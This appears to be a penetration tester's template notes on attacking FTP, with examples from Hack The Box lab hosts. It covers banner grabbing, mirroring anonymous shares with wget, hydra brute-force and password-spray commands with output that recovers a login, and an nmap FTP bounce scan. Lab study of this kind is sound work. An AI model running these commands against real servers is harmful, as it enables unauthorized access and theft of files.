### Interact with the FTP service on the target.
- Banner Grabbing
#### nc
```shell
nc -nv <% tp.frontmatter["RHOSTS"] %>  21
```

**Example**
```shell
BlueTriangle@htb[/htb]$ nc -nv 10.129.14.136 21
```

#### telnet
```shell
telnet   <% tp.frontmatter["RHOSTS"] %> 21
```

**Example**
```shell-session
BlueTriangle@htb[/htb]$ telnet 10.129.14.136 21
```

### Interact with the FTP service on the target using encrypted connection
- This doesn't always work

**Can get**
- hostname
- email
- certificate(s)
#### openssl
```shell
openssl s_client -connect 10.10.10.5:21 -starttls ftp
```

**Example**
```shell-session
BluePho3nix@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp

CONNECTED(00000003)                                                                                      
Can't use SSL_get_servername                        
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1

depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify return:1
---                                                 
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
 
 i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
---
 
Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```


# Anonymous Authentication Misconfiguration
--> Use null authentication 
--> Can add credentials when needed

**Can**
- Get Files
- Upload Files (If the ftp files are accessible on the web app, you can get a reverse shell)
- Etc..

**Use**
- wget
- ftp
- Etc..
## Download All Available Files

```shell
wget -m --no-passive ftp://anonymous:anonymous@<% tp.frontmatter["RHOSTS"] %>
```

```shell
wget -m --no-passive ftp://[username]:[password]@[ip]
```

**Example**
```shell
BluePho3nix@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
           => ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.                                                                 
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       
                                                                                                         
2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   
           => ‘10.129.14.136/Calendar.pptx’                                       
==> CWD not required.                                                           
==> SIZE Calendar.pptx ... done.                                                                                                                            
==> PORT ... done.    ==> RETR Calendar.pptx ... done.       

...SNIP...

2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)


BluePho3nix@htb[/htb]$ tree .

.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

## Anonymous Login

```shell
ftp  <% tp.frontmatter["RHOSTS"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

| **FTP Command** | **Description**         |
| --------------- | ----------------------- |
| `cd`            | Change directories      |
| `ls`            | List files              |
| `ls -r`         | Recursively list files  |
| `get`           | Download a file         |
| `mget`          | Download multiple files |
| `put`           | Upload a file           |
| `mput`          | Upload multiple files   |
| `help`          | View more information   |

# Protocol Specifics Attacks
If there is no anonymous authentication, we will need credentials. We can get credentials with [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack). This is using medusa, there are many other options.
## Brute Forcing

**Brute Forcing**
- Can lock out an account if hit threshold

**Password Spraying**
- Better option
- Try with list of usernames and one common password
- Try more than one password if know the lockout threshold

### Brute Forcing with hydra

**Password and User list**
- Ok on training labs
- There are many password and username lists to try

**Unknown User or Password**
- Okay for CTFs
```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt  ftp://<% tp.frontmatter["RHOSTS"] %>

```

**Known user**
```shell
hydra -l [user] -P /usr/share/wordlists/metasploit/unix_passwords.txt  ftp://<% tp.frontmatter["RHOSTS"] %>
```

**Known password**
```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -p [password]  ftp://<% tp.frontmatter["RHOSTS"] %>
```

**Example**
```shell
BluePho3nix@htb[/htb]$  hydra -L usernames.list -P paswords.list ftp://10.129.202.219
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-13 03:01:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10400 login tries (l:104/p:100), ~650 tries per task
[DATA] attacking ftp://10.129.202.219:21/
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 10144 to do in 00:40h, 16 active
[STATUS] 263.33 tries/min, 790 tries in 00:03h, 9610 to do in 00:37h, 16 active
[STATUS] 260.00 tries/min, 1820 tries in 00:07h, 8580 to do in 00:34h, 16 active
[STATUS] 261.07 tries/min, 3916 tries in 00:15h, 6484 to do in 00:25h, 16 active
[21][ftp] host: 10.129.202.219   login: mike   password: 7777777
```
### FTP Bounce Attack
[https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
![](Pasted%20image%2020240424195848.png)
- `-b` is used for FTP bounce attack
- Use credentials if you have them

```shell
nmap -Pn -v -n -p80 -b anonymous:password@<% tp.frontmatter["RHOSTS"] %> [internal ip]
```

**Example**
```shell
BluePho3nix@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>

```

